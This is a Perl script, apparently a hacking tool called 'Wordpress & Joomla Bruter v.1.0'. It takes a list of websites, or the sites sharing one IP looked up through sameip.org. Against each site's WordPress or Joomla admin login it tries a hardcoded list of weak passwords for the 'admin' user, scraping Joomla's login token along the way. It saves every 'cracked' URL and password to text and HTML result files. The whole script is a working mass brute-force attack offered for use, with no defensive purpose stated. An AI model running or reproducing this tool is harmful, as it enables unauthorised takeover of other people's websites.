#!/usr/bin/perl -X
##########################################################################################
# Wordpress & Joomla Bruter v.1.0                                                        #
# Coded by Kro0oz                                                                        #
##########################################################################################




if($^O =~ /Win/){

   system("cls");

}else{

   system("clear");
}
 print ("\n#######################################################\n");

 print ("    Kro0oz  Wordpress & Joomla Bruter v.1.0\n");
 
 print ("########################################################\n\n\n");
    use warnings;
    use LWP::UserAgent;
	use HTML::LinkExtor;
    use URI::URL;
    use HTTP::Request;
	use HTTP::Request::Common qw(POST);
    use HTTP::Request::Common qw(GET);
    use HTTP::Cookies;
	  $ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$ua->timeout (20);
$ua->cookie_jar(
        HTTP::Cookies->new(
            file => 'mycookies.txt',
            autosave => 1
        )
    );
	
my  $i = 1;
my  $count = 0;
my  $vul = 0;
my  $incount = 0;
$asd = 'wp-submit';	
	$data='wandjbruter.html';
	$admin='admin';
$indicator = 'b';
 open (CHECKR, "<$data");

@CHECKED = <CHECKR>;
close CHECKR;
foreach $Post(@CHECKED) {
if ($Post=~/Bruter/){
$indicator = 'a';
} else {
}
}

open HTML, ">>", "wandjbruter.html" or die $!;
if ($indicator=~/b/){
print HTML "<html xmlns=\"http://www.w3.org/1999/xhtml\"> \n <head> \n <title>Kro0oz  Wordpress & Joomla Bruter v.1.0..!!</title> \n  </head>";
print HTML "<body id=\"#body\" body bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#FF3333\" vlink=\"#C0C0C0\" alink=\"#990000\" marginwidth=\"100\" align=\"left\"> \n";
print HTML "<br /> \n <center>\n <h1><u>Kro0oz  Wordpress & Joomla Bruter v.1.0..!!</u></h1> \n <h2><u>####Scan results####</u></h2> \n ";
} else {
print HTML "<html xmlns=\"http://www.w3.org/1999/xhtml\"> \n <head> \n <title>Kro0oz  Wordpress & Joomla Bruter v.1.0..!!</title> \n  </head>";
print HTML "<body id=\"#body\" body bgcolor=\"#000000\" text=\"#FFFFFF\" link=\"#FF3333\" vlink=\"#C0C0C0\" alink=\"#990000\" marginwidth=\"100\" align=\"left\"> \n";
print HTML "<br /> \n <center>\n ";
}
my @imgs = ();
  sub reverse {
     my($tag, %attr) = @_;
     return if $tag ne 'a';
     push(@TARGETS, values %attr);
  }
print " Do you want to do reverseip or load website list from file..?(y/n)>";
my $revlist=<STDIN>;
if($revlist =~ /y/){
print "\n IP/Website you want to reverse..\? >";
my $website=<STDIN>;
chomp($website);
my $linds = 'http://sameip.org/ip/' . $website;
print (" \n ############################################## \n");
$url = $linds;
  $p = HTML::LinkExtor->new(\&reverse);

  
  $res = $ua->request(HTTP::Request->new(GET => $url),
                      sub {$p->parse($_[0])});

 
  my $base = $res->base;
  @TARGETS = map { $_ = url($_, $base)->abs; } @TARGETS;
  sort(@TARGETS);
  splice (@TARGETS, 0, 1);
  $asshole =$TARGETS[-1];
  print (" \n $asshole \n\n");
  if($asshole =~/nameserverspy/ | $asshole =~ /dailydomains/ | $asshole =~ /sameip/){
  splice (@TARGETS, -6, 6);
  }
  print join("\n", @TARGETS), "\n";
  print (" \n ############################################## \n\n");
  $linkno=$#TARGETS + 1;
goto loop2;
} else {
}
	
	
	
	
  
  print " Path to your website scan list. >";
my $list=<STDIN>;
chomp($list);
  open (THETARGET, "<$list") || die "[-] Can't open the Website list !";
@TARGETS = <THETARGET>;
close THETARGET;
$linkno=$#TARGETS + 1;
	
	
	
	@PASSWORDS = ("qwerty","daryl","123456","admin","password","pass123","123123","admin123","123456789","121212","131313");
	
loop2: foreach $linds(@TARGETS){

@imgs = ();
print ("\n");
print ("\n");
print join("\n", @imgs), "\n";
$incount = 0;
  chomp($linds);

$thelind = $linds;
$thelind = clear($thelind);
$thelind = trim($thelind);
$url = $thelind;

$linkdo=$#imgs + 1;
$redirect = $url . '/wp-admin/';
$wp = $url . '/wp-login.php';
$joom = $url . '/administrator/index.php';
print("\n ------------------------------------------ \n   Bruting $url   \n ------------------------------------------ \n");


##########################################Wordpress Bruting##################################################
 foreach $pass(@PASSWORDS){
 $dollar = 0;
chomp($pass);
$res = 0;
 my $req = POST $wp, [log => $admin, pwd => $pass, $asd => 'Log In', redirect_to => $redirect, testcookie => '1' ];
 
    my $res = $ua->request($req);
	
    if ($res->is_success) {
	$asshole = $res->status_line;
	$dollar = $res->content;
	
        
    } else {
	$asshole = $res->status_line;
print ("\n $asshole \n");
		
    }
	if ($asshole =~ /302/){

	print ("\n\n\n Wordpress website $url cracked with username $admin and password $pass \n\n\n");
	open OUTFILE, ">>", "wandjbruter.txt" or die $!;
		print OUTFILE "$url : $pass \n";
		print HTML "\t\t\n<tr><td><a href=\"$wp\"><font color=\"#66FF66\"><strong>$url</strong></a>  cracked with Username: <font color=\"red\">$admin</font> and Password: <font color=\"red\">$pass</font> </font>\n </br> \n </br> \n";
		close OUTFILE;
		next loop2;
	}
	if ($asshole =~ /404/){
	print("$url not a wordpress site \n\n");
	joomla();
	next loop2;
	};
}
if ($dollar =~ /Joomla/){
joomla();
next loop2;
}
$dollar = 0;
@imgs = ();

$incount = 0
}

##########################################Joomla Bruting##################################################
sub joomla{
loop: foreach $rass(@PASSWORDS){
chomp($rass);



my $red = GET $joom;

    
    my $ret = $ua->request($red);

    
    if ($ret->is_success) {
	print("\n $url is Joomla..!! \n");
        $asshole =  $ret->content;
		$dogy = $ret->status_line;
    } else {
        $assholed = $ret->status_line;
		next loop2;
    }
	$assholed = $ret->status_line;
	if ($assholed =~ /404/){
	print("$url not a Joomla site \n\n");
	next loop2;
	};
	$asdf = '<input type="hidden" name="task" value="login" />';
	while ($asshole =~ m/$asdf/g){
	$asdf = (pos($asshole) - length($1));
	}
	
	$asdf = $asdf + 29;
	$ass = substr ($asshole, $asdf, 32);
	
	my $rreq = POST $joom, [username => $admin, passwd => $rass, lang => 'en-GB', option => 'com_login', task => 'login', $ass => '1' ];

   
    my $rpiq = $ua->request($rreq);
	if ($rpiq->is_success) {
	$assholed = $rpiq->status_line;
	
	$assholeer =  $rpiq->content;
	
	$assholed = $rpiq->status_line;
}

$assholed = $rpiq->status_line;
if ($assholed =~ /303/ | $assholed =~ /301/){
	print ("\n\n\n Joomla website $url cracked with username $admin and password $rass \n\n\n");
	open OUTFILE, ">>", "wandjbruter.txt" or die $!;
		print OUTFILE "$url : $rass \n";
		print HTML "\t\t\n<tr><td><a href=\"$joom\"><font color=\"#66FF66\"><strong>$url</strong></a>  cracked with Username: <font color=\"red\">$admin</font> and Password: <font color=\"red\">$rass</font> </font> \n </br> \n </br> \n";
		close OUTFILE;
		next loop2;
	}


}


}


sub clear{

   $website = shift;

   if($website !~ /^http/){

      $website = 'http://www.' . $website;

   }

   

   return $website;

}

sub trim{
  $string = shift;
  $string =~ s/^\s+//;            
  $string =~ s/\s+$//; 
  return $string;         
}
print ("\n\n Successfully scanned $linkno websites. View results in: 'wandjbruter.html'.\n");
print HTML "\n </center>\n </body> \n </html>";
close HTML;

if($^O =~ /Win/){

   system('.\wandjbruter.html');
 
}else{

   system('./wandjbruter.html');

}
